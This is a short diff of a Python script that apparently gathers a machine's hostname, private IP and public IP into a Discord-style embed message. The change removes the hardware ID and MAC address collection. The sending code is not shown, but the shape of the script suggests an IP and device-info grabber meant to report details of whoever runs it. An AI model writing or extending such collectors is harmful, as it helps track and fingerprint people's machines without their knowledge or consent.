@@ -3,10 +3,7 @@ import requests
 import time
 import socket
 import subprocess
-import uuid
 
-hwid = uuid.getnode()
-mac_address = ':'.join(['{:02x}'.format((hwid >> i) & 0xff) for i in range(0, 48, 8)])
 computer_name = socket.gethostname()
 private_ip = socket.gethostbyname(socket.gethostname())
 public_ip = requests.get('https://ifconfig.me/ip').text.strip()
@@ -20,11 +17,6 @@ embed = {
         {
             "name": "IP Addresses",
             "value": f"Public IP: {public_ip}\nPrivate IP: {private_ip}",
-            "inline": False
-        },
-        {
-            "name": "Device Details",
-            "value": f"HWID: {hex(hwid)}\nMAC Address: {mac_address}",
             "inline": False
         }
     ],
